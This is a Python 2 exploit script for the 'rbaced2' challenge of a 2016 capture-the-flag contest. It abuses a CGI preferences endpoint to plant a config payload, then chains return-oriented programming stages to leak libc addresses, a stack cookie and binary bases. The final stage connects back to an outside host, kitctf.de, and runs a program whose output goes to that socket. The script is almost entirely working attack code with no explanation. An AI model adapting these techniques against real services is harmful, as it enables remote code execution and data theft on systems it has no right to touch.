"""
This is an exploit for rbaced2 from Insomni'Hack CTF Teaser 2016.
Will send the flag to the given host/port via TCP.

Success probability is 1/16, so run this in a loop:
$ while ! python2 exploit3.py; do sleep 0.1; done

Author: niklasb (authenticator ROP chain inspired by saelo's code)
"""

TARGET = ('127.0.0.1', 9090)
auth = "admin:password"
time_step = 1
#TARGET = ('rbaced.insomnihack.ch', 8080)
#auth = "username:password"
#time_step = 1
connect_back = ('kitctf.de', 9999)

import requests
import socket
from base64 import b64encode
import hashlib
import re
import struct
import threading
import time
import sys

def p64(d):
    return struct.pack('<Q', d)

def u64(d):
    return struct.unpack('<Q', d)[0]

def async(f, *args, **kwargs):
    t = threading.Thread(target=f, args=args, kwargs=kwargs)
    t.daemon = False
    t.start()

def strcpys(s):
    payloads = []
    idx = 0
    while s.find('\x00', idx) != -1:
        i = s.find('\x00', idx)
        payloads.append('A'*idx + s[idx:i])
        idx = i+1
    payloads.append('A'*idx + s[idx:])
    return list(reversed(payloads))

def write_prefs(payload):
    r = requests.post(url + '/cgi-bin/preferences',
        data=dict(
            sugar='3',
            cream=payload,
            strength='3',
            type='Espresso',
            stick='yes',
        ),
        **http_args
    )

def read_output():
    r = requests.get(url + '/userdata/%s/out.txt' % fname, stream=True, **http_args)
    return r.raw.read()

def make_sockaddr(ip, port):
    ip_num = 0
    for i in map(int, ip.split('.')):
        ip_num = ip_num * 0x100 + i
    return struct.pack('>HHIQ', 0x0200, port, ip_num, 0)

url = 'http://%s:%d' % TARGET
auth_header = "Basic " + b64encode(auth)

http_args = {
    'headers': { 'Authorization': auth_header, },
    #'proxies': { 'http': 'http://localhost:8080/' }
}

r = requests.get(url + '/cgi-bin/order', **http_args)
ip = re.search(r"IP: '([^']*)'", r.text).group(1)
fname = hashlib.sha1(auth_header+ip).hexdigest()
print '[+] filename = %s' % fname

user_str = '/home/rbaced/www/userdata/%s/pref.txt' % fname
group_str = '/home/rbaced/www/userdata/%s/out.txt' % fname

port = 0x004019a6  # pop rbx ; ret

username_buf = 0x605b28
group_buf = 0x605b8d

# binary gadgets
pop_rdi = 0x4042e3
pop_rax = 0x40244e
pop_rsi = 0x4042e1      # pop rsi ; pop r15 ; ret

close_plt = 0x401430
open_plt = 0x4015D0
puts_plt = 0x401350
strcpy_plt = 0x401340
alarm_plt = 0x401420
memmove_plt = 0x4015b0
exit_plt = 0x401650
write_plt = 0x401370
read_plt = 0x401460
socket_plt = 0x4016e0
connect_plt = 0x401660

mmap_got = 0x6058c8
alarm_got = 0x605908

stage2_buf = 0x00605200
stage2_end = 0x00605b28

fd = 3

# libc gadgets
lc_pop_rdi = 0x00022b1a
lc_pop_rsi = 0x00024805
lc_pop_rdx = 0x00001b8e
lc_pop_rcx = 0x00112ecf

socket_ = 0xfb6b0
connect = 0xfb250
sleep = 0xc0d00
open_ = 0xeb610
write = 0xeb860
read = 0xeb800
close = 0xebf50
exit = 0x3c290
execl = 0xc15f0
execve = 0xc1330
dup2 = 0xebfe0
alarm = 0xc0cf0
sleep = 0xc0d00
mmap = 0xf49c0

def call1(f, *args):
    if len(args)==1:
        return ''.join([
            p64(pop_rdi),
            p64(args[0]),
            p64(f),
        ])
    elif len(args)==2:
        return ''.join([
            p64(pop_rdi),
            p64(args[0]),
            p64(pop_rsi),
            p64(args[1]),
            'A'*8,
            p64(f),
        ])
    elif len(args)==3:
        return ''.join([
            p64(0x004042dc), # pop r12, 13, r14, r15
            p64(0x605af8), # port = &(pop rbx, ret)
            p64(args[2]), # rdx
            p64(args[1]), #rsi
            p64(args[0]), #rdi
            p64(0x004019a6), # pop rbx
            p64(0),
            p64(0x004042c0), # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8]
            p64(f),
        ])
    assert False

dbg = p64(0x4017ba)  # ret in deinitializer routine

stage1 = [
    # call alarm once to fill GOT
    call1(alarm_plt, 2**64-1),

    # alarm -> sleep. this works with chance 1/16
    call1(memmove_plt, alarm_got + 1, 0x40173f, 1),  # \x5d
    call1(strcpy_plt, alarm_got, 0x400007),  # \x00

    # leak libc address
    call1(open_plt, group_buf, 578, 0664),
    call1(write_plt, fd, mmap_got, 8),

    # sleep
    call1(alarm_plt, time_step * 2),

    # re-read pref.txt
    call1(open_plt, username_buf, 0),
    call1(read_plt, fd+1, stage2_buf, 0x42424242),
    p64(0x4042dd),  # pop rsp; 3 x pop; ret
    p64(stage2_buf - 2*8),
]

stage1 = 'A'*(0x400 + 16) + ''.join(stage1)
assert '\n' not in stage1

config = ''
for p in strcpys(stage1):
    config += 'A ' + p[2:] + '\n'
config += 'Group %s\n' % group_str
config += 'User %s\n' % user_str
config += 'Port %d\n' % port
assert len(config) < 0x6a000
print '[+] Config size =', len(config)

write_prefs(config)

#print("Attach now and press enter")
#raw_input()

async(requests.get,
    url + '/cgi-bin/../../rbaced?--config=userdata/%s/pref.txt&--daemon' % fname,
    stream=True,
    **http_args
)
print "[+] Leaking rbaced libc base..."
time.sleep(time_step)

libc = u64(read_output()) - mmap
print "[+] rbaced libc base = %016x" %  libc
if (libc + sleep) & 0xffff != 0x5d00:
    print "[-] Wrongly guessed libc base. Try again (success probability is 1/16)"
    sys.exit(1)

def call2(libc, f, *args, **kw):
    res = []
    if len(args) >= 1 and args[0] is not None: res += [p64(libc + lc_pop_rdi), p64(args[0])]
    if len(args) >= 2 and args[1] is not None: res += [p64(libc + lc_pop_rsi), p64(args[1])]
    if len(args) >= 3 and args[2] is not None: res += [p64(libc + lc_pop_rdx), p64(args[2])]
    if len(args) >= 4 and args[3] is not None: res += [p64(libc + lc_pop_rcx), p64(args[3])]
    if kw.get('debug', False):
        res.append(dbg)
    res.append(p64(libc + f))
    return ''.join(res)

def make_auth_payload(libc):
    return ''

stage2 = ''

auth_sock = 6
file_fd = 7
var_offset = 2200
comm_buf_size = 0x1000
auth_port = 4242

payload_sizes = [
    2744,
    2828,
    2872,
    3288,
    56,
]

tmp_buf = libc + 0x3be7d0   # part of libc BSS

stage2 += call2(libc, socket_, 2, 1, 0)
stage2 += call2(libc, connect, auth_sock, stage2_buf + 8 + var_offset, 16)

for sz in payload_sizes:
    stage2 += call2(libc, sleep, 2*time_step)

    stage2 += call2(libc, open_, username_buf, 0)
    stage2 += call2(libc, read, file_fd, tmp_buf, sz + 8)
    stage2 += call2(libc, close, file_fd)

    stage2 += call2(libc, write, auth_sock, tmp_buf + 8, sz)
    stage2 += call2(libc, read, auth_sock, tmp_buf, comm_buf_size)

    stage2 += call2(libc, open_, group_buf, 578, 0664)
    stage2 += call2(libc, write, file_fd, tmp_buf, comm_buf_size)
    stage2 += call2(libc, close, file_fd)


assert len(stage2) <= var_offset
stage2 = stage2.ljust(var_offset, 'A')
stage2 += make_sockaddr('127.0.0.1', auth_port)
assert stage2_buf + len(stage2) + 20 <= stage2_end
print '[+] Stager size =', len(stage2)

write_prefs(stage2)
time.sleep(2*time_step)

COOKIE_OFFSET = 0x808
OFFSET_COOKIE_EIP = 0x38
OFFSET_START_MAIN = 138949

def comm(payload, i):
    assert len(payload) == payload_sizes[i]
    write_prefs(payload)
    time.sleep(2*time_step)
    return read_output()

# leak cookie
out = comm(b64encode('A'*0x808 + 'B'), 0)
i = out.index('AAAB')
cookie = '\0' + out[i+4:i+11]
print '[+] Cookie:', cookie.encode('hex')

# leak libc base
out = comm(b64encode('C' * (COOKIE_OFFSET + 8 + OFFSET_COOKIE_EIP - 1) + 'D'), 1)
i = out.index('CCCD')
libc_start_main = u64(out[i+4:i+10].ljust(8, b'\x00'))
libc_auth = libc_start_main - OFFSET_START_MAIN
print '[+] authenticator libc base = %016x' % libc_auth

# leak binary base
out = comm(b64encode('E' * (COOKIE_OFFSET + 8 + OFFSET_COOKIE_EIP + 32 - 1) + 'F'), 2)
i = out.index('EEEF')
auth_base = u64(out[i+4:i+10].ljust(8, b'\x00'))
auth_base = auth_base - 0xe80
print '[+] authenticator binary base = %016x' % auth_base

# final ROP chain in authenticator
inbuf = auth_base + 0x202040

auth_rop = 'G'*0x808
auth_rop += cookie
auth_rop += b'H' * OFFSET_COOKIE_EIP
auth_rop += call2(libc_auth, socket_, 2, 1, 0)
auth_rop += call2(libc_auth, connect, 0, inbuf, 16)
auth_rop += call2(libc_auth, dup2, 0, 1)
auth_rop += call2(libc_auth, execve, inbuf + 16, inbuf + 40, inbuf + 40 + 8)
auth_rop += call2(libc_auth, exit, 1337)

assert len(auth_rop) <= 0x9a0
auth_rop = auth_rop.ljust(0x9a0, 'A')

payload = b64encode(auth_rop)
assert len(payload) == payload_sizes[3]
write_prefs(payload)
time.sleep(2*time_step)

# load data for ROP chain into BSS via another send
payload = make_sockaddr(socket.gethostbyname(connect_back[0]), connect_back[1])
payload += '/getflag_part2\0'
assert len(payload) <= 40
payload = payload.ljust(40, '\0')
# new argv
payload += p64(inbuf + 16)
payload += p64(0)

assert len(payload) == payload_sizes[4]
write_prefs(payload)
print '[+] Exploit successful, flag inc :)'
